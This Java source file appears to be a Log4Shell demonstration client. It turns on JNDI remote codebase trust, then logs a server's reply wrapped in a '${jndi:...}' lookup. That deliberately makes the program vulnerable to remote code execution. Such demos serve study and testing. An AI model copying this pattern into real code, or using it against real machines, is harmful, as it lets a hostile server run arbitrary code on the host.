package net.chauhandevs.hacked.JLog4ShellExp;

import java.io.*;
import java.net.Socket;
import java.net.UnknownHostException;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Main {

    static {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
    }
    public static Logger l = LogManager.getLogger(Main.class);

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        Socket connection;
        InputStream is;
        OutputStream os;

        String ip;
        int port;

        String thisMessage;
        String thatMessage;

        l.error("Enter IP of the server to connect to: ");
        ip  = sc.nextLine();

        l.error("Enter Port of the server to connect to: ");
        port = Integer.parseInt(sc.nextLine());

        try {
            connection = new Socket(ip, port);
            is = connection.getInputStream();
            os = connection.getOutputStream();

            PrintWriter writer = new PrintWriter(new OutputStreamWriter(os));
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));

            l.error("Enter a message to send to the server: ");
            thisMessage = sc.nextLine();
            os.write((thisMessage+"\n").getBytes(StandardCharsets.UTF_8));
            os.flush();
            l.error("Message Sent!");

            l.error("Receiving message from server. . .");
            thatMessage = reader.readLine();

            l.error("Message received from server: ");
            l.error("The Server Said: " + ("${jndi:" + thatMessage + "} $"));
            connection.close();
        } catch (Exception e) {
            l.error("An Exception Occurred! : ");
            e.printStackTrace();
        }
    }
}